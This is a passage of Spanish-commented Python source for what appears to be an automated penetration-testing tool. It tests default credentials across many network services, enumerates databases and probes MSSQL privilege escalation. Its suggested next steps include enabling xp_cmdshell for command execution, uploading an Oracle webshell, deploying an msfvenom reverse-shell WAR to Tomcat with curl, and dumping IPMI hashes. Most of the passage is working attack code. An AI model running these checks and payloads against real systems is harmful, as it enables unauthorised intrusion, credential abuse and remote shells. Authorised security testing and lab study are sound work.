        res["missing"].append("nxc/netexec")
    return res


def cc_rdp(ip, ports, deep):
    res = _cc_res("rdp", "RDP", [p["port"] for p in ports])
    nxc = nxc_bin()
    if nxc:
        for p in ports:
            _cc_nxc(res, nxc, "rdp", ip, DEFAULT_CREDS["rdp"], port=p["port"])
    else:
        res["missing"].append("nxc/netexec")
    return res


def cc_ldap(ip, ports, deep):
    res = _cc_res("ldap", "LDAP", [p["port"] for p in ports])
    nxc = nxc_bin()
    if nxc:
        _cc_nxc(res, nxc, "ldap", ip, DEFAULT_CREDS["ldap"])
    else:
        res["missing"].append("nxc/netexec")
    return res


def cc_wmi(ip, ports, deep):
    res = _cc_res("wmi", "WMI / MSRPC", [p["port"] for p in ports])
    nxc = nxc_bin()
    if nxc:
        _cc_nxc(res, nxc, "wmi", ip, DEFAULT_CREDS["wmi"])
    else:
        res["missing"].append("nxc/netexec")
    return res


def cc_vnc(ip, ports, deep):
    res = _cc_res("vnc", "VNC", [p["port"] for p in ports])
    nxc = nxc_bin()
    if nxc:
        for p in ports:
            cmd = [nxc, "vnc", ip, "--port", str(p["port"])]
            rc, out = run_capture(cmd, timeout=40)
            ok = _nxc_ok(out)
            _step(res, shlex.join(cmd), ok, out,
                  note="¿VNC acepta conexión sin autenticación o con contraseña por defecto?")
            if re.search(r"\(Pwn3d!\)|No Authentication|without password", out, re.I):
                res["findings"].append(("critica", f"VNC {p['port']}: acceso gráfico SIN autenticación"))
    else:
        res["missing"].append("nxc/netexec")
    return res


def cc_mysql(ip, ports, deep):
    res = _cc_res("mysql", "MySQL", [p["port"] for p in ports])
    if not have("mysql"):
        res["missing"].append("mysql (mariadb-client)")
        res["next"].append(f"nmap -p3306 --script mysql-empty-password {ip}")
        return res
    for p in ports:
        port = p["port"]
        for u, pw, lbl in DEFAULT_CREDS["mysql"]:
            cmd = ["mysql", "-h", ip, "-P", str(port), "-u", u,
                   "--connect-timeout=5", "-N", "-B", "-e", "SELECT 1"]
            rc, out = run_capture(cmd, timeout=20, env={"MYSQL_PWD": pw})
            ok = _mysql_ok(rc, out)
            shown = shlex.join(cmd) + ("  (MYSQL_PWD=***)" if pw else "")
            _step(res, shown, ok, out,
                  note=f"probar {lbl} y CONFIRMAR con SELECT 1 (no basta con conectar)")
            if ok:
                res["findings"].append(("critica", f"MySQL {port}: acceso con credencial por defecto {lbl} (confirmado con SELECT 1)"))
                res["next"].append(f"mysql -h {ip} -u {u} -p   # SHOW DATABASES; y, según secure_file_priv, LOAD_FILE()/INTO OUTFILE")
                _db_enum(res, "mysql", ip, port, u, pw, None)   # lista BBDD + tablas de las no de sistema
                break
    return res


def cc_postgres(ip, ports, deep):
    res = _cc_res("postgres", "PostgreSQL", [p["port"] for p in ports])
    if not have("psql"):
        res["missing"].append("psql (postgresql-client)")
        res["next"].append(f"nmap -p5432 --script pgsql-brute {ip}")
        return res
    for p in ports:
        port = p["port"]
        for u, pw, lbl in DEFAULT_CREDS["postgres"]:
            cmd = ["psql", "-h", ip, "-p", str(port), "-U", u, "-w", "-t", "-A",
                   "-c", "SELECT 1", "postgres"]
            rc, out = run_capture(cmd, timeout=20,
                                  env={"PGPASSWORD": pw, "PGCONNECT_TIMEOUT": "5"})
            ok = _psql_ok(rc, out)
            _step(res, shlex.join(cmd) + "  (PGPASSWORD=***)", ok, out,
                  note=f"probar {lbl} y CONFIRMAR con SELECT 1")
            if ok:
                res["findings"].append(("critica", f"PostgreSQL {port}: acceso con credencial por defecto {lbl} (confirmado)"))
                res["next"].append(f"psql -h {ip} -U {u}   # \\l lista bases; COPY ... FROM PROGRAM → RCE si eres superusuario")
                _db_enum(res, "postgres", ip, port, u, pw, None)   # lista BBDD + tablas de las no de sistema
                break
    return res


def cc_mssql(ip, ports, deep):
    res = _cc_res("mssql", "MSSQL", [p["port"] for p in ports])
    nxc = nxc_bin()
    if nxc:
        for p in ports:
            hit = _cc_nxc(res, nxc, "mssql", ip, DEFAULT_CREDS["mssql"], port=p["port"])
            if hit:
                res["next"].append(f"nxc mssql {ip} -u {hit[0] or 'USER'} -p '{hit[1]}' -x whoami   # si xp_cmdshell está activo → RCE")
                _db_enum(res, "mssql", ip, p["port"], hit[0] or "sa", hit[1], None)   # BBDD/tablas + impersonación/linked/sysadmin
    else:
        res["missing"].append("nxc/netexec")
    return res


# ─────────────── Enumeración de bases de datos con credencial válida ───────────────
# Con un login válido de BD (MSSQL / MySQL-MariaDB / PostgreSQL) se listan las BASES DE DATOS y,
# de las que NO son de sistema, sus TABLAS (solo lectura; ni fuerza bruta ni escritura). Las de
# sistema se omiten al listar tablas — lo jugoso está en las de la aplicación.
_DB_SYSTEM = {
    "mssql": {"master", "tempdb", "model", "msdb", "resource", "reportserver",
              "reportservertempdb", "distribution", "ssisdb"},
    "mysql": {"information_schema", "mysql", "performance_schema", "sys"},
    "postgres": {"postgres", "template0", "template1"},
}


def _parse_mssqlclient_col(out):
    """Valores de una consulta de UNA columna hecha con impacket-mssqlclient por stdin (no-tty):
    se saltan las líneas de prompt 'SQL (...)>' (que en no-interactivo llevan pegada la cabecera de
    la columna), los separadores de guiones, los marcadores de estado/errores y las vacías."""
    rows = []
    for line in (out or "").splitlines():
        t = line.strip()
        if not t or ("SQL (" in line and ")>" in line):
            continue
        if set(t) <= set("- "):
            continue
        if t.startswith(("ERROR(", "[-]", "[*]", "[!]", "[+]", "Impacket", "Press help")):
            continue
        rows.append(t)
    return rows


def _db_enum_mysql(res, ip, port, user, password):
    if not have("mysql"):
        res["missing"].append("mysql (mariadb-client)")
        return [], {}
    base_cmd = ["mysql", "-h", ip, "-P", str(port), "-u", user, "--skip-ssl",
                "--connect-timeout=5", "-N", "-B", "-e"]
    rc, out = run_capture(base_cmd + ["SELECT schema_name FROM information_schema.schemata"],
                          timeout=30, env={"MYSQL_PWD": password}, quiet=True)
    _step(res, f"mysql -h {ip} -P {port} -u {user} -e 'SELECT schema_name …'  (MYSQL_PWD=***)",
          rc == 0 and "access denied" not in out.lower(), out,
          note="listar las bases de datos con la credencial")
    if "access denied" in out.lower() or "error 1045" in out.lower():
        return [], {}
    dbs = [l.strip() for l in out.splitlines() if l.strip()]
    q = ("SELECT table_schema, table_name FROM information_schema.tables "
         "WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys') "
         "ORDER BY table_schema, table_name")
    rc2, out2 = run_capture(base_cmd + [q], timeout=30, env={"MYSQL_PWD": password}, quiet=True)
    _step(res, "mysql … information_schema.tables (bases NO de sistema)  (MYSQL_PWD=***)",
          rc2 == 0, out2, note="tablas de las bases de datos no de sistema")
    tables = {}
    for l in out2.splitlines():
        if "\t" in l:
            db, _, tb = l.partition("\t")
            tables.setdefault(db.strip(), []).append(tb.strip())
    return dbs, tables


def _db_enum_postgres(res, ip, port, user, password):
    if not have("psql"):
        res["missing"].append("psql (postgresql-client)")
        return [], {}
    env = {"PGPASSWORD": password, "PGCONNECT_TIMEOUT": "5"}
    def _psql(db, q):
        return run_capture(["psql", "-h", ip, "-p", str(port), "-U", user, "-w", "-t", "-A",
                            "-c", q, db], timeout=30, env=env, quiet=True)
    rc, out = _psql("postgres", "SELECT datname FROM pg_database WHERE datistemplate=false")
    _step(res, f"psql -h {ip} -U {user} -c 'SELECT datname FROM pg_database …'  (PGPASSWORD=***)",
          rc == 0 and "fatal:" not in out.lower(), out, note="listar las bases de datos con la credencial")
    if "authentication failed" in out.lower() or "fatal:" in out.lower():
        return [], {}
    dbs = [l.strip() for l in out.splitlines() if l.strip()]
    tables = {}
    for d in dbs:
        if d.lower() in _DB_SYSTEM["postgres"]:
            continue
        _, out2 = _psql(d, "SELECT table_schema||'.'||table_name FROM information_schema.tables "
                           "WHERE table_schema NOT IN ('pg_catalog','information_schema')")
        tables[d] = [l.strip() for l in out2.splitlines() if l.strip() and "fatal" not in l.lower()]
    return dbs, tables


def _db_enum_mssql(res, ip, port, user, password, is_hash):
    if not have("impacket-mssqlclient"):
        res["missing"].append("impacket-mssqlclient (impacket)")
        return [], {}
    def _q(query, wauth):
        tgt = f"{user}@{ip}" if is_hash else f"{user}:{password}@{ip}"   # impacket parte por el ÚLTIMO @
        cmd = ["impacket-mssqlclient", tgt, "-port", str(port)]
        if is_hash:
            cmd += ["-hashes", password]
        if wauth:
            cmd.append("-windows-auth")
        _, out = run_capture(cmd, timeout=35, input_text=f"{query}\nexit\n", quiet=True)
        return out or ""
    # Windows-auth para cuentas de dominio/locales (lo normal en la pila Windows); SQL-auth (sin
    # flag) para logins SQL tipo 'sa'. Se prueba el modo más probable; si da fallo de login CLARO
    # se prueba el otro — nunca se reintenta tras un cuelgue (SQL-auth a cuenta Windows cuelga).
    order = [False, True] if user.lower() == "sa" else [True, False]
    out, wauth_used = "", order[0]
    for w in order:
        out = _q("SELECT name FROM sys.databases", w)
        if _parse_mssqlclient_col(out):
            wauth_used = w
            break
        if "login failed" not in out.lower() and "authentication" not in out.lower():
            break   # no fue fallo de auth (timeout/otro): no reintentes el otro modo
    dbs = _parse_mssqlclient_col(out)
    _step(res, f"impacket-mssqlclient {user}:***@{ip} -port {port}"
               + (" -windows-auth" if wauth_used else "") + "  ->  SELECT name FROM sys.databases",
          bool(dbs), out, note="listar las bases de datos con la credencial")
    if not dbs:
        return [], {}
    # Privesc MSSQL (camino clásico CPTS). Se PRUEBA de verdad (solo lectura, nada de SELECT),
    # no solo se lista: ¿la cuenta ES sysadmin?, ¿a quién puede IMPERSONAR y alguno ES sysadmin?,
    # ¿hay LINKED SERVERS y alguno corre como sysadmin (directo o impersonando)? Un linked server que
    # mapea a un login sysadmin = escalada → xp_cmdshell (RCE). También se mira si xp_cmdshell ya está on.
    sysadmin = "1" in _parse_mssqlclient_col(_q("SELECT IS_SRVROLEMEMBER('sysadmin')", wauth_used))
    imp = [x for x in _parse_mssqlclient_col(_q(
        "SELECT DISTINCT b.name FROM sys.server_permissions a "
        "INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id "
        "WHERE a.permission_name = 'IMPERSONATE'", wauth_used)) if x]
    linked = [x for x in _parse_mssqlclient_col(_q(
        "SELECT name FROM sys.servers WHERE is_linked = 1", wauth_used)) if x]
    xp_on = "1" in _parse_mssqlclient_col(_q(
        "SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'", wauth_used))
    # (a) ¿algún login impersonable ES sysadmin?  EXECUTE AS LOGIN=X; IS_SRVROLEMEMBER; REVERT
    imp_sa = [lg for lg in imp[:10] if "1" in _parse_mssqlclient_col(_q(
        f"EXECUTE AS LOGIN = '{lg}'; SELECT IS_SRVROLEMEMBER('sysadmin'); REVERT", wauth_used))]
    # (b) ¿algún linked server corre como sysadmin?  directo y, si no, impersonando a cada login
    linked_sa = []   # (servidor, contexto)
    for srv in linked[:10]:
        if "1" in _parse_mssqlclient_col(_q(
                f"EXECUTE('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [{srv}]", wauth_used)):
            linked_sa.append((srv, "directo")); continue
        for lg in imp[:10]:
            if "1" in _parse_mssqlclient_col(_q(
                    f"EXECUTE AS LOGIN = '{lg}'; EXECUTE('SELECT IS_SRVROLEMEMBER(''sysadmin'')') AT [{srv}]; REVERT", wauth_used)):
                linked_sa.append((srv, f"impersonando a {lg}")); break
    _step(res, "impacket-mssqlclient … IS_SRVROLEMEMBER / server_permissions / sys.servers / EXECUTE AS / EXECUTE AT",
          True, f"sysadmin_directo={int(sysadmin)}  xp_cmdshell_activo={int(xp_on)}  impersonar={', '.join(imp) or '-'}  "
                f"impersonables_sysadmin={', '.join(imp_sa) or '-'}  linked={', '.join(linked) or '-'}  "
                f"linked_como_sysadmin={', '.join(f'{s} ({c})' for s, c in linked_sa) or '-'}",
          note="privesc MSSQL PROBADO (solo lectura): sysadmin directo, impersonación→sysadmin y linked→sysadmin")
    # ── Camino a RCE: se da por CONFIRMADO si hay un contexto sysadmin alcanzable ──
    if sysadmin or imp_sa or linked_sa:
        if sysadmin:
            via = "la cuenta ya ES sysadmin"
        elif imp_sa:
            via = f"impersonando a «{imp_sa[0]}» (que ES sysadmin): EXECUTE AS LOGIN = '{imp_sa[0]}'"
        else:
            srv, ctx = linked_sa[0]
            via = f"vía linked server [{srv}] ({ctx}), que corre como sysadmin"
        estado = "ya ACTIVADO" if xp_on else "ACTIVABLE (tienes contexto sysadmin)"
        res["findings"].append(("critica", f"MSSQL (cred {user}): CAMINO A RCE — {via} → xp_cmdshell {estado} "
            "→ ejecución de comandos como la cuenta de servicio SQL (a menudo NT AUTHORITY\\SYSTEM)"))
        if linked_sa:
            srv, ctx = linked_sa[0]
            pre = "" if ctx == "directo" else f"EXECUTE AS LOGIN = '{ctx.split()[-1]}'; "
            res["next"] += [
                pre + f"EXEC('sp_configure ''show advanced options'',1;RECONFIGURE;') AT [{srv}];",
                pre + f"EXEC('sp_configure ''xp_cmdshell'',1;RECONFIGURE;') AT [{srv}];",
                pre + f"EXEC('xp_cmdshell ''whoami''') AT [{srv}];   # RCE (ejecútalo en el cliente SQL)",
            ]
        else:
            asl = "" if sysadmin else f"EXECUTE AS LOGIN = '{imp_sa[0]}'; "
            res["next"].append(asl + "EXEC sp_configure 'show advanced options',1;RECONFIGURE;"
                               "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami';   # RCE")
    else:
        # Sin contexto sysadmin confirmado — deja lo descubierto para intento manual
        if imp:
            res["findings"].append(("alta", f"MSSQL (cred {user}): puede IMPERSONAR a: {', '.join(imp)} "
                "(ninguno resultó sysadmin en la prueba) — revisa con cada uno accesos a BBDD y linked servers"))
        if linked:
            res["findings"].append(("alta", f"MSSQL (cred {user}): linked server(s): {', '.join(linked)} "
                "(no dieron sysadmin en la prueba, ni directo ni impersonando) — revísalos a mano"))
    res["findings"].append(("info", f"MSSQL (cred {user}): xp_cmdshell {'ACTIVADO' if xp_on else 'desactivado'}; "
        f"sysadmin directo: {'sí' if sysadmin else 'no'}"))
    tables = {}
    for d in dbs:
        if d.lower() in _DB_SYSTEM["mssql"]:
            continue
        o = _q(f"SELECT TABLE_SCHEMA+'.'+TABLE_NAME FROM [{d}].INFORMATION_SCHEMA.TABLES", wauth_used)
        tables[d] = _parse_mssqlclient_col(o)
    return dbs, tables


def _db_cred_test(np, ip, port, u, p):
    """Fase 5d: prueba una credencial APORTADA contra MySQL/PostgreSQL con la MISMA operación
    mínima de verificación que la Fase 5c (cc_mysql/cc_postgres: SELECT 1, no basta con
    conectar), pero con el usuario/contraseña del operador en vez de la lista de credenciales
    por defecto. A diferencia de SMB/LDAP/MSSQL, mysql/postgres NO son protocolos de `nxc`
    (no tiene módulo para ellos) — por eso no pueden pasar por el mismo bucle basado en nxc del
    resto de la Fase 5d, y necesitan este camino aparte con el cliente CLI real (mysql/psql).
    Devuelve (ok, comando_mostrado, output): `ok` es None si el cliente no está instalado
    (distinto de credencial inválida, que es False)."""
    if np == "mysql":
        if not have("mysql"):
            return None, None, None
        cmd = ["mysql", "-h", ip, "-P", str(port), "-u", u, "--connect-timeout=5", "-N", "-B", "-e", "SELECT 1"]
        rc, out = run_capture(cmd, timeout=20, env={"MYSQL_PWD": p or ""})
        shown = shlex.join(cmd) + ("  (MYSQL_PWD=***)" if p else "")
        return _mysql_ok(rc, out), shown, out
    if np == "postgres":
        if not have("psql"):
            return None, None, None
        cmd = ["psql", "-h", ip, "-p", str(port), "-U", u, "-w", "-t", "-A", "-c", "SELECT 1", "postgres"]
        rc, out = run_capture(cmd, timeout=20, env={"PGPASSWORD": p or "", "PGCONNECT_TIMEOUT": "5"})
        shown = shlex.join(cmd) + "  (PGPASSWORD=***)"
        return _psql_ok(rc, out), shown, out
    return None, None, None


def _db_enum(res, proto, ip, port, user, password, base, is_hash=False):
    """Fase 5c/5d: con una credencial VÁLIDA de BD, lista las bases de datos y las tablas de las NO
    de sistema (solo lectura). proto ∈ {mssql, mysql, postgres}. Añade hallazgos + un paso por
    consulta y vuelca el detalle a db_<proto>.txt (si hay carpeta). No escribe nada en el objetivo."""
    try:
        if proto == "mysql":
            dbs, tables = _db_enum_mysql(res, ip, port, user, password)
        elif proto == "postgres":
            dbs, tables = _db_enum_postgres(res, ip, port, user, password)
        elif proto == "mssql":
            dbs, tables = _db_enum_mssql(res, ip, port, user, password, is_hash)
        else:
            return
    except Exception as e:                         # una enum que peta NO tumba el resto de la fase
        warn(f"enumeración de BD ({proto}) falló: {e}")
        return
    if not dbs:
        return
    sysset = _DB_SYSTEM.get(proto, set())
    user_dbs = [d for d in dbs if d.lower() not in sysset]
    res["findings"].append(("alta", f"{proto.upper()} (cred {user}): {len(dbs)} base(s) de datos; de "
        f"usuario: {', '.join(user_dbs) if user_dbs else 'ninguna (solo de sistema)'}"))
    detail = [f"# {proto.upper()} @ {ip}:{port}  (cred: {user})",
              f"bases de datos ({len(dbs)}): {', '.join(dbs)}",
              f"de usuario (no sistema): {', '.join(user_dbs) or '(ninguna)'}", ""]
    for d in user_dbs:
        tbls = tables.get(d, [])
        detail.append(f"[{d}] — {len(tbls)} tabla(s):")
        detail += ([f"    {t}" for t in tbls] if tbls
                   else ["    (sin tablas visibles / sin acceso con esta cuenta)"])
        detail.append("")
        if tbls:
            shown = ", ".join(tbls[:10]) + ("…" if len(tbls) > 10 else "")
            res["findings"].append(("alta", f"{proto.upper()} '{d}': {len(tbls)} tabla(s) — {shown}"))
    if base:
        try:
            outf = Path(base) / f"db_{proto}.txt"
            outf.write_text("\n".join(detail) + "\n", encoding="utf-8")
            res["next"].append(f"# BBDD/tablas de {proto.upper()} volcadas a {outf}")
        except OSError:
            pass
    if proto == "mssql":
        res["next"].append(f"impacket-mssqlclient {user}:'PASS'@{ip}"
                           + ("" if user.lower() == "sa" else " -windows-auth")
                           + "   ->  enable_xp_cmdshell; xp_cmdshell 'whoami'   # RCE si eres sysadmin / EXECUTE AS para impersonar a sa")
    elif proto == "mysql":
        res["next"].append(f"mysql -h {ip} -u {user} -p   # revisa las tablas de usuario; según secure_file_priv: LOAD_FILE()/INTO OUTFILE")
    elif proto == "postgres":
        res["next"].append(f"psql -h {ip} -U {user}   # COPY ... FROM PROGRAM → RCE si eres superusuario")


def cc_redis(ip, ports, deep):
    res = _cc_res("redis", "Redis", [p["port"] for p in ports])
    if not have("redis-cli"):
        res["missing"].append("redis-cli (redis-tools)")
        return res
    for p in ports:
        port = p["port"]
        rc, out = run_capture(["redis-cli", "-h", ip, "-p", str(port), "PING"], timeout=15)
        if re.search(r"\bPONG\b", out):
            _step(res, f"redis-cli -h {ip} -p {port} PING", True, out, note="¿responde sin credenciales?")
            res["findings"].append(("critica", f"Redis {port}: accesible SIN autenticación (PING→PONG)"))
            res["next"] += [f"redis-cli -h {ip} -p {port} CONFIG GET dir",
                            f"redis-cli -h {ip} -p {port} --scan"]
        elif "NOAUTH" in out:
            _step(res, f"redis-cli -h {ip} -p {port} PING", False, out, note="requiere contraseña")
            for pw in ("foobared", "redis", "password"):
                _, o2 = run_capture(["redis-cli", "-h", ip, "-p", str(port),
                                     "--no-auth-warning", "PING"], timeout=15,
                                    env={"REDISCLI_AUTH": pw})
                ok = bool(re.search(r"\bPONG\b", o2))
                _step(res, f"redis-cli -h {ip} -p {port} PING  (REDISCLI_AUTH=***)", ok, o2,
                      note=f"contraseña por defecto '{pw}'")
                if ok:
                    res["findings"].append(("critica", f"Redis {port}: contraseña por defecto '{pw}'"))
                    break
        else:
            _step(res, f"redis-cli -h {ip} -p {port} PING", False, out or "(sin respuesta)")
    return res


def cc_snmp(ip, ports, deep):
    res = _cc_res("snmp", "SNMP", [p["port"] for p in ports])
    if not have("snmpwalk"):
        res["missing"].append("snmpwalk (snmp)")
        return res
    for comm in SNMP_COMMUNITIES:
        cmd = ["snmpwalk", "-v2c", "-c", comm, "-t", "2", "-r", "1", ip, "1.3.6.1.2.1.1.1.0"]
        rc, out = run_capture(cmd, timeout=20)
        ok = _snmp_ok(out)
        _step(res, shlex.join(cmd), ok, out,
              note=f"community '{comm}' (en SNMPv1/2c la community es la credencial)")
        if ok:
            res["findings"].append(("alta", f"SNMP: community por defecto '{comm}' permite lectura (sysDescr obtenido)"))
            res["next"].append(f"snmpwalk -v2c -c {comm} {ip}   # volcar el árbol (procesos, usuarios, rutas, a veces credenciales)")
            break   # con una válida basta: evita ruido y no hace falta seguir probando
    return res


def cc_oracle(ip, ports, deep):
    res = _cc_res("oracle", "Oracle TNS", [p["port"] for p in ports])
    if have("tnscmd10g"):
        rc, out = run_capture(["tnscmd10g", "version", "-h", ip], timeout=20)
        _step(res, f"tnscmd10g version -h {ip}", rc == 0, out, note="versión del listener TNS")
    if have("odat"):
        for p in ports:
            port = p["port"]
            # 1) descubrir el SID (sin SID no se pueden probar credenciales)
            rc, out = run_capture(["odat", "sidguesser", "-s", ip, "-p", str(port)], timeout=500)
            _step(res, f"odat sidguesser -s {ip} -p {port}", rc == 0, out,
                  note="descubrir el SID/Service Name del listener (hace falta para probar credenciales)")
            detected = list(dict.fromkeys(
                re.findall(r"['\"]?([A-Za-z0-9_$]{1,30})['\"]?\s+is\s+a\s+valid\s+SID", out, re.I)))
            if detected:
                res["findings"].append(("alta", f"Oracle {port}: SID(s) descubiertos: {', '.join(detected)}"))
            # 2) credenciales por defecto contra cada SID (odat trae su lista de cuentas)
            for sid in (detected or ["XE", "ORCL", "XEXDB"])[:3]:
                cmd = ["odat", "passwordguesser", "-s", ip, "-p", str(port), "-d", sid]
                rc, out = run_capture(cmd, timeout=500)
                creds = re.findall(r"'([^']+)'/'([^']+)'", out)
                ok = bool(creds) or re.search(r"valid credential|Valid account", out, re.I) is not None
                _step(res, shlex.join(cmd), ok, out,
                      note=f"probar cuentas/contraseñas por defecto de Oracle contra el SID {sid}")
                for u, pw in creds:
                    res["findings"].append(("critica", f"Oracle {port}: credencial por defecto válida {u}/{pw} (SID {sid})"))
                    res["next"].append(f"odat utlfile -s {ip} -p {port} -d {sid} -U {u} -P {pw} --sysdba --putFile C:\\\\inetpub\\\\wwwroot shell.aspx ./shell.aspx   # subir webshell")
                if creds:
                    break
    else:
        res["missing"].append("odat")
    res["next"] += [
        f"sudo nmap -p{ports[0]['port']} --script oracle-sid-brute {ip}   # alternativa para descubrir el SID",
        f"sqlplus scott/tiger@//{ip}:{ports[0]['port']}/SID   # o system/manager, sys/change_on_install, dbsnmp/dbsnmp",
    ]
    return res


def cc_ipmi(ip, ports, deep):
    res = _cc_res("ipmi", "IPMI / BMC", [p["port"] for p in ports])
    if have("ipmitool"):
        for u, pw, vendor in IPMI_CREDS:
            cmd = ["ipmitool", "-I", "lanplus", "-H", ip, "-U", u, "-E", "chassis", "status"]
            rc, out = run_capture(cmd, timeout=20, env={"IPMI_PASSWORD": pw})
            ok = rc == 0 and "System Power" in out
            _step(res, f"ipmitool -I lanplus -H {ip} -U {u} -E chassis status  (IPMI_PASSWORD=***)", ok, out,
                  note=f"probar credencial por defecto {u}/{pw} ({vendor}) por IPMI 2.0")
            if ok:
                res["findings"].append(("critica", f"IPMI: credencial por defecto {u}/{pw} ({vendor}) válida (chassis status OK)"))
                break
    else:
        res["missing"].append("ipmitool (freeipmi/ipmitool)")
    # El 'vulnerable a RAKP' es cierto SOLO si hay un BMC de verdad escuchando: sobre un
    # 623/udp 'open|filtered' que no respondió, era un falso positivo (fantasma). Solo se
    # marca como hallazgo si el puerto está confirmado 'open'; si no, queda de sugerencia.
    if any(p.get("state") == "open" for p in ports):
        res["findings"].append(("info", "IPMI 2.0: vulnerable por diseño al volcado de hashes RAKP (no requiere credenciales)"))
    res["next"].append("msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS "
                       + ip + "; run; exit'   # hashes RAKP → hashcat -m 7300 (si el 623 responde)")
    return res


def cc_tomcat(ip, p, deep):
    scheme = web_scheme(p)
    port = p["port"]
    res = _cc_res("tomcat", f"Tomcat Manager {scheme}://:{port}", [port])
    base = f"{scheme}://{ip}:{port}"
    for u, pw, lbl in DEFAULT_CREDS["tomcat"]:
        url = f"{base}/manager/html"
        status, body = _http_get_auth(url, u, pw)
        ok = _tomcat_ok(status, body)
        _step(res, f"GET {url}  (Authorization: Basic {u}:{pw})", ok, f"HTTP {status}",
              note=f"probar {lbl} y CONFIRMAR que carga el Tomcat Manager (no un 200 de error)")
        if ok:
            res["findings"].append(("critica", f"Tomcat {port}: Manager accesible con {lbl} → desplegar un WAR = RCE"))
            res["next"].append(
                f"msfvenom -p java/jsp_shell_reverse_tcp LHOST=TU_IP LPORT=4444 -f war > r.war ; "
                f"curl -u {u}:{pw} -T r.war '{base}/manager/text/deploy?path=/r' ; curl {base}/r/")
            break
    return res


_CC_DISPATCH = {
    "ftp": cc_ftp, "ssh": cc_ssh, "smb": cc_smb, "winrm": cc_winrm, "rdp": cc_rdp,
    "ldap": cc_ldap, "msrpc": cc_wmi, "vnc": cc_vnc, "mysql": cc_mysql,
    "postgres": cc_postgres, "mssql": cc_mssql, "redis": cc_redis, "snmp": cc_snmp,
    "oracle": cc_oracle, "ipmi": cc_ipmi,
}


def _mongo_ok(out):
    """Acceso MongoDB sin autenticación confirmado: listDatabases devolvió el listado
    y no hubo error de autorización."""
    low = out.lower()
    if "requires authentication" in low or "unauthorized" in low or "not authorized" in low:
        return False
    return "databases" in low or "totalsize" in low


def cc_mongodb(ip, ports, deep):
    res = _cc_res("mongodb", "MongoDB", [p["port"] for p in ports])
    client = next((t for t in ("mongosh", "mongo") if have(t)), None)
    for p in ports:
        port = p["port"]
        if client == "mongosh":
            cmd = ["mongosh", f"mongodb://{ip}:{port}/", "--quiet", "--eval",
                   "db.adminCommand({listDatabases:1})"]
        elif client == "mongo":
            cmd = ["mongo", "--host", ip, "--port", str(port), "--quiet", "--eval",
                   "db.adminCommand({listDatabases:1})"]
        else:
            break
        rc, out = run_capture(cmd, timeout=25)
        ok = _mongo_ok(out)
        _step(res, shlex.join(cmd), ok, out,
              note="¿MongoDB permite acceso SIN autenticación? (lista las bases de datos)")
        if ok:
            res["findings"].append(("critica", f"MongoDB {port}: accesible SIN autenticación (listDatabases OK)"))
            res["next"].append(f"{client} 'mongodb://{ip}:{port}/'   # show dbs; use <db>; db.<col>.find()")
    if not client:
        res["missing"].append("mongosh/mongo (cliente de MongoDB)")
        res["findings"].append(("info", "MongoDB: por defecto NO exige autenticación — instala mongosh para comprobarlo en vivo"))
        for p in ports:
            res["next"].append(f"mongosh 'mongodb://{ip}:{p['port']}' --eval 'db.adminCommand({{listDatabases:1}})'")
    res["next"].append(f"nmap -p{','.join(str(p['port']) for p in ports)} --script mongodb-info,mongodb-databases {ip}")
    return res


def cc_telnet(ip, ports, deep):
    res = _cc_res("telnet", "Telnet", [p["port"] for p in ports])
    for p in ports:
        b = grab_banner(ip, p["port"], timeout=5)
        _step(res, f"banner telnet {ip}:{p['port']}", bool(b), b or "(sin banner)",
              note="el banner suele delatar fabricante/modelo (router, switch, cámara) → credenciales por defecto conocidas")
    res["findings"].append(("media", "Telnet expuesto: tráfico y credenciales viajan en claro"))
    res["next"].append(f"hydra -C /usr/share/seclists/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt telnet://{ip}   # credenciales por defecto (manual)")
    return res


_CC_DISPATCH.update({"mongodb": cc_mongodb, "telnet": cc_telnet})


def creds_check(ip, services, host, deep):
    """Fase 5c: por cada servicio reconocido lanza su probador de credenciales por
    defecto. Devuelve una lista de dicts con la MISMA forma que el footprinting, así
    que se renderizan y exportan igual (pantalla + HTML + JSON) sin tocar nada más."""
    phase("Fase 5c — credenciales por defecto (verificadas)",
          "prueba SOLO credenciales de fábrica/instalación conocidas de cada servicio y confirma el acceso; descarta falsos positivos y NO hace fuerza bruta (eso queda como sugerencia manual)")
    buckets = {}
    for p in services:
        if not _confirmed_open(p):                 # UDP open|filtered sin confirmar: no gastar cred-checks (coherente con el footprint, línea ~2104); evita 5×20s de ipmitool y 7× snmpwalk sobre un 623/161 fantasma
            continue
        proto = classify(p)
        if proto:
            buckets.setdefault(proto, []).append(p)
    out = []
    for proto, ports in buckets.items():
        fn = _CC_DISPATCH.get(proto)
        if not fn:
            continue
        try:
            out.append(fn(ip, ports, deep))
        except Exception as e:                     # un protocolo que peta no tumba el resto
            warn(f"creds {proto} falló: {e}")
    for p in services:                             # Tomcat: solo sobre webs que lo parezcan
        if is_web(p) and _is_tomcat(p):
            try:
                out.append(cc_tomcat(ip, p, deep))
            except Exception as e:
                warn(f"creds tomcat {p['port']} falló: {e}")
    return out


# ═══════════════ Credenciales APORTADAS (Fase 5d — reutilización) ═══════════════
# Prueba las credenciales que el operador ya ha reunido (--user/--pass, --user-list/-U +
# --pass-list/-P cruzadas, o --creds-file) contra TODOS los servicios detectados: reutilizar
# una credencial válida en otros protocolos/cuentas es uno de los caminos más habituales
# (ver labs CPTS). 1 intento por par y servicio — salvo -U+-P con listas grandes, que ya
# es spraying real a propósito (avisa y pide confirmar, ver confirm_creds_spray). La
# contraseña se enmascara en el informe.
_NXC_PROTO_OF = {"smb": "smb", "ssh": "ssh", "winrm": "winrm", "rdp": "rdp",
                 "vnc": "vnc", "msrpc": "wmi", "mssql": "mssql", "ldap": "ldap", "ftp": "ftp"}

# Orden en el que se prueban los protocolos detectados (buckets de provided_creds_check):
# SMB primero — es el más rápido/fiable para confirmar una credencial de dominio con nxc
# (ground truth, y de ahí cuelga el volcado SAM/LSA tras un Pwn3d!) — seguido de LDAP (la
# enumeración AD más rica: --kerberoasting/--asreproast/certipy). WMI va DELIBERADAMENTE
# el último de los protocolos Windows: además de ser más lento que SMB para lo mismo, nxc
# tiene un bug confirmado con listas de usuarios (crashea con "'str' object has no
# attribute 'decode'" contra -u <fichero>), así que cuanto antes se confirme/enriquezca
